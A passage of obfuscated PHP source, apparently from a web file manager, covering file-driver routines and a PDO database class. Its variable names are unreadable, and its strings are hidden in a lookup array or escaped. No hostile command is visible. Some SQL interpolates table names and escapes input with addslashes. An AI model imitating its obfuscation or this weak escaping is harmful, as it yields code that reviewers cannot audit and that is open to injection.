for ($¦ıÀöî = 0; $¦ıÀöî < count($Ë­‚Ö ô); $¦ıÀöî++) { if ($¦ıÀöî == 0 && $‹ÇÂãÁÕ <= $Ë­‚Ö ô[$¦ıÀöî]) { $‹ÇÂãÁÕ = $Ë­‚Ö ô[$¦ıÀöî]; break; } else { if ($‹ÇÂãÁÕ > $Ë­‚Ö ô[$¦ıÀöî - 1] && $‹ÇÂãÁÕ <= $Ë­‚Ö ô[$¦ıÀöî]) { $‹ÇÂãÁÕ = $Ë­‚Ö ô[$¦ıÀöî]; break; } else { if ($¦ıÀöî == count($Ë­‚Ö ô) - 1 && $‹ÇÂãÁÕ > $Ë­‚Ö ô[$¦ıÀöî]) { $‹ÇÂãÁÕ = $Ë­‚Ö ô[$¦ıÀöî]; break; } } } } $÷ñ‚øö = self::driverMake($Š¸ÃÂÁ); if ($÷ñ‚øö->isFileOutServer()) { return $÷ñ‚øö->fileOutImageServer($Š¸ÃÂÁ, $‹ÇÂãÁÕ); } return $÷ñ‚øö->fileOutImage($Š¸ÃÂÁ, $‹ÇÂãÁÕ); } private static function driverIsSame($ÊÓÉªÊ, $œş•è) { $Ü¦üİŞ¨ =& $_SERVER[…É¦À–]; $¼‡×Š»´ = $ÊÓÉªÊ->getType(); $Áã³±ª = $œş•è->getType(); if ($¼‡×Š»´ != $Áã³±ª) { return !1; } if ($¼‡×Š»´ == $Ü¦üİŞ¨[797]) { return !0; } if ($¼‡×Š»´ == $Ü¦üİŞ¨[106]) { return !0; } if ($ÊÓÉªÊ->pathDriver == $œş•è->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÏÑ¡ÕŒ, $…Áší¶Æ) { $ßáÑ†Ó =& $_SERVER[…É¦À–]; if (!IO::exist($ÏÑ¡ÕŒ)) { return !1; } if (!IO::exist($…Áší¶Æ)) { IO::mkdir($…Áší¶Æ); } $·ù¸İ°¸ = array_to_keyvalue(self::listAllSimple($ÏÑ¡ÕŒ), $ßáÑ†Ó[84]); $ßˆïÙ«Ï = array_to_keyvalue(self::listAllSimple($…Áší¶Æ), $ßáÑ†Ó[84]); $¼´ˆõŞ˜ = array(); $û—ÔÒÍ€ = array(); foreach ($·ù¸İ°¸ as $Ú®ã‡„° => $¾¶º»ß’) { if (isset($ßˆïÙ«Ï[$Ú®ã‡„°])) { if ($¾¶º»ß’[$ßáÑ†Ó[75]] == 1) { continue; } if ($ßˆïÙ«Ï[$Ú®ã‡„°][$ßáÑ†Ó[76]] == $¾¶º»ß’[$ßáÑ†Ó[76]]) { continue; } } if ($¾¶º»ß’[$ßáÑ†Ó[75]] == 1) { $û—ÔÒÍ€[] = $…Áší¶Æ . $ßáÑ†Ó[8] . trim($Ú®ã‡„°, $ßáÑ†Ó[8]); continue; } $êò·š‘ˆ = strstr(trim($Ú®ã‡„°, $ßáÑ†Ó[8]), $ßáÑ†Ó[8]) ? get_path_father($Ú®ã‡„°) : $ßáÑ†Ó[12]; $¼´ˆõŞ˜[] = array($ßáÑ†Ó[1205] => $¾¶º»ß’[$ßáÑ†Ó[86]], $ßáÑ†Ó[1206] => rtrim($…Áší¶Æ, $ßáÑ†Ó[8]) . $ßáÑ†Ó[8] . $êò·š‘ˆ, $ßáÑ†Ó[1207] => $¾¶º»ß’); } $´ø¬ÈÆŒ = array($ßáÑ†Ó[200] => $¼´ˆõŞ˜, $ßáÑ†Ó[75] => $û—ÔÒÍ€); Hook::trigger($ßáÑ†Ó[1208], $ÏÑ¡ÕŒ, $…Áší¶Æ, $´ø¬ÈÆŒ); foreach ($û—ÔÒÍ€ as $¾¶º»ß’) { IO::mkdir($¾¶º»ß’); } foreach ($¼´ˆõŞ˜ as $¾¶º»ß’) { IO::copy($¾¶º»ß’[$ßáÑ†Ó[1205]], $¾¶º»ß’[$ßáÑ†Ó[1206]], REPEAT_REPLACE); } } public static function fileSubstr($éïùó, $¥©Ÿ–¹©, $¨ÅÛƒ’¼ = false) { $Ùı­şá =& $_SERVER[…É¦À–]; $ñüúò²” = self::driverMake($éïùó); $Ø±ÜŒÍ = $ñüúò²”->size($éïùó); $À’øõÀ = $¥©Ÿ–¹©; $¼”¾¿ÉÇ = $¨ÅÛƒ’¼; if ($¥©Ÿ–¹© < 0) { $¥©Ÿ–¹© = $Ø±ÜŒÍ + $¥©Ÿ–¹©; } if ($¨ÅÛƒ’¼ === !1) { $¨ÅÛƒ’¼ = $Ø±ÜŒÍ - $¥©Ÿ–¹©; } if ($¥©Ÿ–¹© + $¨ÅÛƒ’¼ > $Ø±ÜŒÍ) { $¨ÅÛƒ’¼ = $Ø±ÜŒÍ - $¥©Ÿ–¹©; } if (!$Ø±ÜŒÍ && $ñüúò²”->getType() == $Ùı­şá[106] && !$ñüúò²”->exist($éïùó)) { $›Ï¢Ë™µ = get_path_this($éïùó); $½¡˜åÉá = parse_url_query($›Ï¢Ë™µ); if (is_array($½¡˜åÉá) && isset($½¡˜åÉá[$Ùı­şá[32]])) { $›Ï¢Ë™µ = urldecode($½¡˜åÉá[$Ùı­şá[32]]); } throw new Exception($Ùı­şá[1209] . LNG($Ùı­şá[1210]) . $Ùı­şá[1011] . clear_html($›Ï¢Ë™µ) . $Ùı­şá[12]); } if ($¨ÅÛƒ’¼ <= 0) { return $Ùı­şá[12]; } if ($¥©Ÿ–¹© < 0 || $¥©Ÿ–¹© >= $Ø±ÜŒÍ || $¨ÅÛƒ’¼ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\x65\122\145\x61\144\40\x65\162\162\157\x72\41\x20\163\164\x61\162\164\x3d{$¥©Ÿ–¹©}\73\x6c\x65\156\x67\164\x68\75{$¨ÅÛƒ’¼}\x3b\40\x73\151\172\145\x3d{$Ø±ÜŒÍ}\73"); } $Ê¾ŠŠ¡™ = $ñüúò²”->fileSubstr($éïùó, $¥©Ÿ–¹©, $¨ÅÛƒ’¼); if (!$Ê¾ŠŠ¡™ && $¨ÅÛƒ’¼ && isset($GLOBALS[$Ùı­şá[1211]])) { throw new Exception($GLOBALS[$Ùı­şá[1211]][$Ùı­şá[1212]]); } return $Ê¾ŠŠ¡™; } private static function driverMake(&$éÈŸ©ÖÃ) { $³¹ ‡Îñ =& $_SERVER[…É¦À–]; $¼¤Œå– = KodIO::parse($éÈŸ©ÖÃ); if (!self::$driverListSystem) { $œ¼úÜ‚† = Model($³¹ ‡Îñ[807])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($œ¼úÜ‚†, $³¹ ‡Îñ[428]); } if ($¼¤Œå–[$³¹ ‡Îñ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¼¤Œå–[$³¹ ‡Îñ[428]]]) { return !1; } $éÈŸ©ÖÃ = $¼¤Œå–[$³¹ ‡Îñ[1213]]; $¢¡Ó ÅÕ = self::driverGet($¼¤Œå–, $éÈŸ©ÖÃ); return $¢¡Ó ÅÕ; } private static function driverGet($«İíò›˜, &$ëÕü«áş) { $áëÅ’ÚÏ =& $_SERVER[…É¦À–]; $ªÜ—äÏ­ = $«İíò›˜[$áëÅ’ÚÏ[1214]]; $‚´éÀùÈ = $«İíò›˜[$áëÅ’ÚÏ[428]]; switch ($«İíò›˜[$áëÅ’ÚÏ[33]]) { case KodIO::KOD_IO: $²ø‘„× = self::$driverListSystem[$‚´éÀùÈ]; break; case KodIO::KOD_SOURCE: $ëÕü«áş = $‚´éÀùÈ . $ëÕü«áş; $²ø‘„× = array($áëÅ’ÚÏ[1215] => $áëÅ’ÚÏ[1216], $áëÅ’ÚÏ[6] => $«İíò›˜); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ş©–øÎÓ = $GLOBALS[$áëÅ’ÚÏ[1217]]; self::$driverListUser = array_to_keyvalue($ş©–øÎÓ, $áëÅ’ÚÏ[428]); } $²ø‘„× = self::$driverListUser[$‚´éÀùÈ]; break; case KodIO::KOD_SHARE_LINK: $²ø‘„× = array($áëÅ’ÚÏ[1215] => $áëÅ’ÚÏ[1218], $áëÅ’ÚÏ[6] => $«İíò›˜); $š½Ñ²úØ = Action($áëÅ’ÚÏ[1219])->sharePathInfo($«İíò›˜[$áëÅ’ÚÏ[84]]); $ëÕü«áş = $š½Ñ²úØ[$áëÅ’ÚÏ[431]]; if (!$š½Ñ²úØ[$áëÅ’ÚÏ[431]]) { $¿ŠÏ­ìŸ = Model($áëÅ’ÚÏ[621])->getInfo($š½Ñ²úØ[$áëÅ’ÚÏ[622]]); $ëÕü«áş = KodIO::clear($¿ŠÏ­ìŸ[$áëÅ’ÚÏ[1220]] . $«İíò›˜[$áëÅ’ÚÏ[1213]]); $«İíò›˜[$áëÅ’ÚÏ[515]] = $¿ŠÏ­ìŸ; $«İíò›˜[$áëÅ’ÚÏ[1196]] = $ëÕü«áş; $²ø‘„× = array($áëÅ’ÚÏ[1215] => $áëÅ’ÚÏ[1221], $áëÅ’ÚÏ[6] => $«İíò›˜); } break; case KodIO::KOD_SHARE_ITEM: $²ø‘„× = array($áëÅ’ÚÏ[1215] => $áëÅ’ÚÏ[1222], $áëÅ’ÚÏ[6] => $«İíò›˜); $¿ŠÏ­ìŸ = Model($áëÅ’ÚÏ[621])->getInfo($«İíò›˜[$áëÅ’ÚÏ[428]]); if ($¿ŠÏ­ìŸ[$áëÅ’ÚÏ[431]] == $áëÅ’ÚÏ[198]) { $ëÕü«áş = KodIO::clear($¿ŠÏ­ìŸ[$áëÅ’ÚÏ[1220]] . $«İíò›˜[$áëÅ’ÚÏ[1213]]); $«İíò›˜[$áëÅ’ÚÏ[515]] = $¿ŠÏ­ìŸ; $«İíò›˜[$áëÅ’ÚÏ[1196]] = $ëÕü«áş; $²ø‘„× = array($áëÅ’ÚÏ[1215] => $áëÅ’ÚÏ[1223], $áëÅ’ÚÏ[6] => $«İíò›˜); } else { if (!$ëÕü«áş) { $ëÕü«áş = $¿ŠÏ­ìŸ[$áëÅ’ÚÏ[431]]; } } break; default: $ëÕü«áş = $«İíò›˜[$áëÅ’ÚÏ[84]]; $²ø‘„× = array($áëÅ’ÚÏ[1215] => $áëÅ’ÚÏ[1224]); break; } $ı·º‹Õù = $«İíò›˜[$áëÅ’ÚÏ[84]]; if (!isset(self::$driverCache[$ı·º‹Õù])) { $ï¢ÌÖş§ = strtolower($²ø‘„×[$áëÅ’ÚÏ[95]]); $«è¾µ¿ = $GLOBALS[$áëÅ’ÚÏ[6]][$áëÅ’ÚÏ[89]][$áëÅ’ÚÏ[866]]; $Ğ¥æ¦«å = $áëÅ’ÚÏ[74] . (isset($«è¾µ¿[$ï¢ÌÖş§]) ? $«è¾µ¿[$ï¢ÌÖş§] : ucfirst($ï¢ÌÖş§)); if (!class_exists($Ğ¥æ¦«å)) { show_json("{$Ğ¥æ¦«å}\x20\x6e\x6f\164\x20\145\x78\x69\x73\x74\x73\x21", !1); } $ê’šö–­ = isset($²ø‘„×[$áëÅ’ÚÏ[6]]) ? $²ø‘„×[$áëÅ’ÚÏ[6]] : !1; self::$driverCache[$ı·º‹Õù] = new $Ğ¥æ¦«å($ê’šö–­); } $ ú§¯ä  = self::$driverCache[$ı·º‹Õù]; $ ú§¯ä ->pathDriver = $ªÜ—äÏ­; $ ú§¯ä ->pathBase = $áëÅ’ÚÏ[12]; if (isset($²ø‘„×[$áëÅ’ÚÏ[6]][$áëÅ’ÚÏ[1225]])) { $ ú§¯ä ->pathBase = rtrim($²ø‘„×[$áëÅ’ÚÏ[6]][$áëÅ’ÚÏ[1225]], $áëÅ’ÚÏ[8]) . $áëÅ’ÚÏ[8]; $ëÕü«áş = $ ú§¯ä ->pathBase . ltrim($ëÕü«áş, $áëÅ’ÚÏ[8]); } $ëÕü«áş = $ ú§¯ä ->getPath($ëÕü«áş); if (isset($«İíò›˜[$áëÅ’ÚÏ[1196]])) { $ëÕü«áş = $«İíò›˜[$áëÅ’ÚÏ[1196]]; } $ ú§¯ä ->path = $ëÕü«áş; return $ ú§¯ä ; } public static function errorTips($Ò™òü„“ = false) { $¢‹»¨Óƒ =& $_SERVER[…É¦À–]; static $ÀÎª¤‘Ä = array(); $­’âØÊÇ = 1000; if ($Ò™òü„“ === -1) { return $ÀÎª¤‘Ä ? $ÀÎª¤‘Ä[count($ÀÎª¤‘Ä) - 1] : $¢‹»¨Óƒ[12]; } if ($Ò™òü„“ === !1) { return implode($¢‹»¨Óƒ[231], $ÀÎª¤‘Ä); } if (count($ÀÎª¤‘Ä) >= $­’âØÊÇ) { $ÀÎª¤‘Ä = array_slice($ÀÎª¤‘Ä, $­’âØÊÇ * 0.5, $­’âØÊÇ); } $ÀÎª¤‘Ä[] = $Ò™òü„“; write_log($¢‹»¨Óƒ[162] . ACTION . $¢‹»¨Óƒ[1226] . $Ò™òü„“, $¢‹»¨Óƒ[1227]); } public static function getLastError($Ú¤×£ = '') { $ìİ¨¡Áé = self::errorTips(-1); return $ìİ¨¡Áé ? $ìİ¨¡Áé : $Ú¤×£; } } goto BÜ•›â–ëÆ; DÎŠŠ÷ßÈ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($¬ß‚‹¸Æ = '') { $ÎœóŠÄ¦ =& $_SERVER[…É¦À–]; if (!class_exists($ÎœóŠÄ¦[959])) { think_exception(think_lang($ÎœóŠÄ¦[14]) . $ÎœóŠÄ¦[960]); } if (!empty($¬ß‚‹¸Æ)) { $this->config = $¬ß‚‹¸Æ; if (empty($this->config[$ÎœóŠÄ¦[17]])) { $this->config[$ÎœóŠÄ¦[17]] = array(); } } } public function connect($ĞôŸ“İ— = '', $ÖŞë”¿ğ = 0) { $ğ˜Ü¢Ì‚ =& $_SERVER[…É¦À–]; if (!isset($this->linkID[$ÖŞë”¿ğ])) { if (empty($ĞôŸ“İ—)) { $ĞôŸ“İ— = $this->config; } $úËÒÓŒˆ = !empty($ĞôŸ“İ—[$ğ˜Ü¢Ì‚[17]][$ğ˜Ü¢Ì‚[18]]) ? $ĞôŸ“İ—[$ğ˜Ü¢Ì‚[17]][$ğ˜Ü¢Ì‚[18]] : $this->pconnect; if ($úËÒÓŒˆ) { $ĞôŸ“İ—[$ğ˜Ü¢Ì‚[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÖŞë”¿ğ] = new PDO($ĞôŸ“İ—[$ğ˜Ü¢Ì‚[961]], $ĞôŸ“İ—[$ğ˜Ü¢Ì‚[933]], $ĞôŸ“İ—[$ğ˜Ü¢Ì‚[934]], $ĞôŸ“İ—[$ğ˜Ü¢Ì‚[17]]); } catch (PDOException $É–ùøÃê) { think_exception($É–ùøÃê->getMessage()); } $this->dbType = $this->_getDsnType($ĞôŸ“İ—[$ğ˜Ü¢Ì‚[961]]); if (in_array($this->dbType, array($ğ˜Ü¢Ì‚[962], $ğ˜Ü¢Ì‚[963], $ğ˜Ü¢Ì‚[964], $ğ˜Ü¢Ì‚[965]))) { think_exception($ğ˜Ü¢Ì‚[966] . $this->dbType . $ğ˜Ü¢Ì‚[967] . $this->dbType . $ğ˜Ü¢Ì‚[968]); } if (!$this->linkID[$ÖŞë”¿ğ]) { think_exception($ğ˜Ü¢Ì‚[969]); } try { $this->linkID[$ÖŞë”¿ğ]->exec($ğ˜Ü¢Ì‚[970] . think_config($ğ˜Ü¢Ì‚[936])); } catch (Exception $É–ùøÃê) { } $this->connected = !0; if (1 != think_config($ğ˜Ü¢Ì‚[22])) { unset($this->config); } } return $this->linkID[$ÖŞë”¿ğ]; } public function free() { $this->PDOStatement = null; } public function query($˜ùİ°¨Ñ, $Ó­·‘Ö = array()) { $âİä”‘Š =& $_SERVER[…É¦À–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $˜ùİ°¨Ñ; if (!empty($Ó­·‘Ö)) { $this->queryStr .= $âİä”‘Š[971] . print_r($Ó­·‘Ö, !0) . $âİä”‘Š[972]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($âİä”‘Š[23], 1); think_status($âİä”‘Š[24]); $this->PDOStatement = $this->_linkID->prepare($˜ùİ°¨Ñ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $³½È¾µŞ = $this->PDOStatement->execute($Ó­·‘Ö); $this->debug(); if (!1 === $³½È¾µŞ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($•§ëÂ«­, $†Ë‡Õ– = array()) { $òˆ˜ãÁ¿ =& $_SERVER[…É¦À–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $•§ëÂ«­; if (!empty($†Ë‡Õ–)) { $this->queryStr .= $òˆ˜ãÁ¿[971] . print_r($†Ë‡Õ–, !0) . $òˆ˜ãÁ¿[972]; } $İà£ñ×¢ = !1; if ($this->dbType == $òˆ˜ãÁ¿[965]) { if (preg_match($òˆ˜ãÁ¿[973], $this->queryStr, $Œ×‚á¶)) { $this->table = think_config($òˆ˜ãÁ¿[974]) . str_ireplace(think_config($òˆ˜ãÁ¿[975]), $òˆ˜ãÁ¿[407], $Œ×‚á¶[2]); $İà£ñ×¢ = (bool) $this->query($òˆ˜ãÁ¿[976] . strtoupper($this->table) . $òˆ˜ãÁ¿[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($òˆ˜ãÁ¿[25], 1); think_status($òˆ˜ãÁ¿[24]); $this->PDOStatement = $this->_linkID->prepare($•§ëÂ«­); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $„ñ¢é®ß = $this->PDOStatement->execute($†Ë‡Õ–); $this->debug(); if (!1 === $„ñ¢é®ß) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($İà£ñ×¢ || preg_match($òˆ˜ãÁ¿[977], $•§ëÂ«­)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $€ÂøÙµæ = $this->_linkID->commit(); $this->transTimes = 0; if (!$€ÂøÙµæ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $çç›­òÚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$çç›­òÚ) { $this->error(); return !1; } } return !0; } private function getAll() { $†œ”ıı = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($†œ”ıı); return $†œ”ıı; } public function getFields($ªÊŞ›‘¤) { $ê¸›É·Å =& $_SERVER[…É¦À–]; $this->initConnect(!0); if (think_config($ê¸›É·Å[978])) { $¬¹Ì»Š² = str_replace($ê¸›É·Å[979], $ªÊŞ›‘¤, think_config($ê¸›É·Å[978])); } else { switch ($this->dbType) { case $ê¸›É·Å[962]: case $ê¸›É·Å[980]: $¬¹Ì»Š² = "\x53\105\x4c\x45\103\124\40\40\40\x63\157\154\x75\155\x6e\137\x6e\141\x6d\145\x20\141\163\40\47\x4e\x61\155\x65\x27\54\x20\40\x20\x64\141\x74\x61\137\164\x79\160\x65\40\141\163\x20\x27\124\x79\160\145\x27\x2c\x20\40\40\143\x6f\154\165\x6d\156\x5f\x64\145\x66\141\165\x6c\164\x20\x61\163\40\x27\104\145\x66\x61\x75\x6c\164\47\54\x20\x20\x20\151\163\x5f\156\165\154\154\x61\x62\x6c\145\x20\x61\x73\x20\x27\x4e\165\x6c\x6c\x27\xa\11\x9\106\122\x4f\x4d\x9\x69\156\146\157\162\x6d\x61\164\x69\157\156\x5f\x73\x63\150\145\155\141\56\164\x61\142\x6c\x65\163\x20\101\x53\x20\x74\xa\x9\x9\112\117\x49\x4e\x9\151\x6e\x66\x6f\x72\x6d\141\x74\x69\x6f\x6e\137\163\143\x68\x65\155\141\56\143\157\154\165\x6d\156\x73\x20\x41\x53\40\143\12\x9\x9\117\116\x20\x20\x74\56\x74\141\142\154\145\x5f\x63\x61\164\x61\x6c\x6f\147\x20\x3d\40\x63\x2e\164\x61\142\x6c\145\x5f\143\141\164\141\154\157\x67\xa\11\11\101\x4e\x44\40\164\56\164\x61\x62\x6c\x65\137\163\143\150\x65\155\x61\40\x3d\40\x63\x2e\164\x61\x62\154\x65\x5f\x73\x63\x68\145\x6d\141\xa\11\11\x41\x4e\x44\x20\164\x2e\164\141\x62\x6c\x65\x5f\156\141\x6d\x65\40\x3d\40\143\56\164\141\142\x6c\145\x5f\x6e\141\155\145\12\11\x9\127\x48\105\x52\x45\40\x20\40\x74\x2e\164\x61\x62\154\145\137\156\141\x6d\x65\40\x3d\x20\47{$ªÊŞ›‘¤}\x27"; break; case $ê¸›É·Å[981]: $¬¹Ì»Š² = $ê¸›É·Å[982] . $ªÊŞ›‘¤ . $ê¸›É·Å[983]; break; case $ê¸›É·Å[963]: case $ê¸›É·Å[965]: $¬¹Ì»Š² = $ê¸›É·Å[984] . $ê¸›É·Å[985] . $ê¸›É·Å[986] . strtoupper($ªÊŞ›‘¤) . $ê¸›É·Å[987] . strtoupper($ªÊŞ›‘¤) . $ê¸›É·Å[988]; break; case $ê¸›É·Å[989]: $¬¹Ì»Š² = $ê¸›É·Å[990] . $ªÊŞ›‘¤ . $ê¸›É·Å[991]; break; case $ê¸›É·Å[964]: break; case $ê¸›É·Å[992]: default: $¬¹Ì»Š² = $ê¸›É·Å[993] . ($this->dbType == $ê¸›É·Å[992] ? "\x60{$ªÊŞ›‘¤}\140" : $ªÊŞ›‘¤); } } $ÚÚŒ²İ˜ = $this->query($¬¹Ì»Š²); $ÎÕâ«Ó = array(); if ($ÚÚŒ²İ˜) { foreach ($ÚÚŒ²İ˜ as $ô¿ü‚ª => $è§áõé) { $è§áõé = array_change_key_case($è§áõé); $è§áõé[$ê¸›É·Å[32]] = isset($è§áõé[$ê¸›É·Å[32]]) ? $è§áõé[$ê¸›É·Å[32]] : $ê¸›É·Å[407]; $è§áõé[$ê¸›É·Å[33]] = isset($è§áõé[$ê¸›É·Å[33]]) ? $è§áõé[$ê¸›É·Å[33]] : $ê¸›É·Å[407]; $áØÓ¦ºÀ = isset($è§áõé[$ê¸›É·Å[302]]) ? $è§áõé[$ê¸›É·Å[302]] : $è§áõé[$ê¸›É·Å[32]]; $ÎÕâ«Ó[$áØÓ¦ºÀ] = array($ê¸›É·Å[32] => $áØÓ¦ºÀ, $ê¸›É·Å[33] => $è§áõé[$ê¸›É·Å[33]], $ê¸›É·Å[35] => (bool) (isset($è§áõé[$ê¸›É·Å[103]]) && $è§áõé[$ê¸›É·Å[103]] === $ê¸›É·Å[12] || isset($è§áõé[$ê¸›É·Å[35]]) && $è§áõé[$ê¸›É·Å[35]] === $ê¸›É·Å[12]), $ê¸›É·Å[37] => isset($è§áõé[$ê¸›É·Å[37]]) ? $è§áõé[$ê¸›É·Å[37]] : (isset($è§áõé[$ê¸›É·Å[56]]) ? $è§áõé[$ê¸›É·Å[56]] : $ê¸›É·Å[407]), $ê¸›É·Å[39] => isset($è§áõé[$ê¸›É·Å[94]]) ? strtolower($è§áõé[$ê¸›É·Å[94]]) == $ê¸›É·Å[41] : (isset($è§áõé[$ê¸›É·Å[57]]) ? $è§áõé[$ê¸›É·Å[57]] : !1), $ê¸›É·Å[42] => isset($è§áõé[$ê¸›É·Å[994]]) ? strtolower($è§áõé[$ê¸›É·Å[994]]) == $ê¸›É·Å[44] : (isset($è§áõé[$ê¸›É·Å[94]]) ? $è§áõé[$ê¸›É·Å[94]] : !1)); } } return $ÎÕâ«Ó; } public function getTables($ø¯ú¸ËŠ = '') { $ª‰ƒ©Ö  =& $_SERVER[…É¦À–]; if (think_config($ª‰ƒ©Ö [995])) { $Ï¢ãã¨« = str_replace($ª‰ƒ©Ö [996], $ø¯ú¸ËŠ, think_config($ª‰ƒ©Ö [995])); } else { switch ($this->dbType) { case $ª‰ƒ©Ö [963]: case $ª‰ƒ©Ö [965]: $Ï¢ãã¨« = $ª‰ƒ©Ö [997]; break; case $ª‰ƒ©Ö [962]: case $ª‰ƒ©Ö [980]: $Ï¢ãã¨« = $ª‰ƒ©Ö [998]; break; case $ª‰ƒ©Ö [989]: $Ï¢ãã¨« = $ª‰ƒ©Ö [999]; break; case $ª‰ƒ©Ö [964]: think_exception(think_lang($ª‰ƒ©Ö [1000]) . $ª‰ƒ©Ö [1001]); break; case $ª‰ƒ©Ö [981]: $Ï¢ãã¨« = $ª‰ƒ©Ö [45] . $ª‰ƒ©Ö [46] . $ª‰ƒ©Ö [47]; break; case $ª‰ƒ©Ö [992]: default: if (!empty($ø¯ú¸ËŠ)) { $Ï¢ãã¨« = $ª‰ƒ©Ö [944] . $ø¯ú¸ËŠ . $ª‰ƒ©Ö [945]; } else { $Ï¢ãã¨« = $ª‰ƒ©Ö [946]; } } } $Ë´ìâÊÄ = $this->query($Ï¢ãã¨«); $¢Ÿ×úÉÊ = array(); foreach ($Ë´ìâÊÄ as $‘›ş‰ÙË => $ó¶²­ƒ´) { $¢Ÿ×úÉÊ[$‘›ş‰ÙË] = current($ó¶²­ƒ´); } return $¢Ÿ×úÉÊ; } protected function parseLimit($şÌš›Ø¯) { $“‰¹ÅŒ­ =& $_SERVER[…É¦À–]; $ÑüÓÌ Ú = $“‰¹ÅŒ­[12]; if (!empty($şÌš›Ø¯)) { switch ($this->dbType) { case $“‰¹ÅŒ­[989]: case $“‰¹ÅŒ­[981]: $şÌš›Ø¯ = explode($“‰¹ÅŒ­[50], $şÌš›Ø¯); if (count($şÌš›Ø¯) > 1) { $ÑüÓÌ Ú .= $“‰¹ÅŒ­[51] . $şÌš›Ø¯[1] . $“‰¹ÅŒ­[52] . $şÌš›Ø¯[0] . $“‰¹ÅŒ­[53]; } else { $ÑüÓÌ Ú .= $“‰¹ÅŒ­[51] . $şÌš›Ø¯[0] . $“‰¹ÅŒ­[53]; } break; case $“‰¹ÅŒ­[962]: case $“‰¹ÅŒ­[980]: break; case $“‰¹ÅŒ­[964]: break; case $“‰¹ÅŒ­[963]: case $“‰¹ÅŒ­[965]: break; case $“‰¹ÅŒ­[992]: default: $ÑüÓÌ Ú .= $“‰¹ÅŒ­[51] . $şÌš›Ø¯ . $“‰¹ÅŒ­[53]; } } return $ÑüÓÌ Ú; } public function parseKey(&$Ş¾…»ØŒ, $÷¡ò¢ÍĞ = true) { $ı…´¦æä =& $_SERVER[…É¦À–]; if ($÷¡ò¢ÍĞ) { $Ş¾…»ØŒ = $this->parseKeyCheck($Ş¾…»ØŒ); } if ($this->dbType == $ı…´¦æä[992]) { if ($Ş¾…»ØŒ != $ı…´¦æä[189] && !preg_match($ı…´¦æä[956], $Ş¾…»ØŒ)) { $Ş¾…»ØŒ = $ı…´¦æä[414] . trim($Ş¾…»ØŒ, $ı…´¦æä[414]) . $ı…´¦æä[414]; } return $Ş¾…»ØŒ; } else { return parent::parseKey($Ş¾…»ØŒ, $÷¡ò¢ÍĞ); } } public function close() { $this->_linkID = null; } public function error() { $ßîó‚Èİ =& $_SERVER[…É¦À–]; if ($this->PDOStatement) { $öÔ«åö¤ = $this->PDOStatement->errorInfo(); $this->error = $öÔ«åö¤[1] . $ßîó‚Èİ[4] . $öÔ«åö¤[2]; } else { $this->error = $ßîó‚Èİ[12]; } if ($ßîó‚Èİ[12] != $this->queryStr) { $this->error .= LNG($ßîó‚Èİ[48]) . $this->queryStr; } think_trace($this->error, $ßîó‚Èİ[12], $ßîó‚Èİ[49]); return $this->error; } public function escapeString($Ÿ–Ğ÷œè) { $İÌÈÒÃá =& $_SERVER[…É¦À–]; switch ($this->dbType) { case $İÌÈÒÃá[989]: case $İÌÈÒÃá[962]: case $İÌÈÒÃá[980]: case $İÌÈÒÃá[992]: return addslashes($Ÿ–Ğ÷œè); case $İÌÈÒÃá[964]: case $İÌÈÒÃá[981]: case $İÌÈÒÃá[963]: case $İÌÈÒÃá[965]: return str_ireplace($İÌÈÒÃá[58], $İÌÈÒÃá[59], $Ÿ–Ğ÷œè); } } protected function parseValue($ô¯÷×Æ) { $îµÆˆ†Ï =& $_SERVER[…É¦À–]; if (is_string($ô¯÷×Æ)) { $ìÎè€ = strpos($ô¯÷×Æ, $îµÆˆ†Ï[4]) === 0 && in_array($ô¯÷×Æ, array_keys($this->bind)); $ô¯÷×Æ = $ìÎè€ ? $this->escapeString($ô¯÷×Æ) : $îµÆˆ†Ï[1002] . $this->escapeString($ô¯÷×Æ) . $îµÆˆ†Ï[1002]; } elseif (isset($ô¯÷×Æ[0]) && is_string($ô¯÷×Æ[0]) && strtolower($ô¯÷×Æ[0]) == $îµÆˆ†Ï[326]) { $ô¯÷×Æ = $this->escapeString($ô¯÷×Æ[1]); } elseif (is_array($ô¯÷×Æ)) { $ô¯÷×Æ = array_map(array($this, $îµÆˆ†Ï[1003]), $ô¯÷×Æ); } elseif (is_bool($ô¯÷×Æ)) { $ô¯÷×Æ = $ô¯÷×Æ ? $îµÆˆ†Ï[88] : $îµÆˆ†Ï[198]; } elseif (is_null($ô¯÷×Æ)) { $ô¯÷×Æ = $îµÆˆ†Ï[103]; } return $ô¯÷×Æ; } public function getLastInsertId() { $Ô’ŸÒ´Ì =& $_SERVER[…É¦À–]; switch ($this->dbType) { case $Ô’ŸÒ´Ì[989]: case $Ô’ŸÒ´Ì[981]: case $Ô’ŸÒ´Ì[962]: case $Ô’ŸÒ´Ì[980]: case $Ô’ŸÒ´Ì[964]: case $Ô’ŸÒ´Ì[992]: return $this->_linkID->lastInsertId(); case $Ô’ŸÒ´Ì[963]: case $Ô’ŸÒ´Ì[965]: $àôÜ¡±Â = $this->table; $ÊÙ·Ÿ„• = $this->query("\123\x45\x4c\x45\103\x54\x20{$àôÜ¡±Â}\56\143\165\x72\x72\166\x61\154\x20\143\165\x72\x72\166\x61\x6c\x20\x46\122\x4f\x4d\x20\144\x75\141\154"); return $ÊÙ·Ÿ„• ? 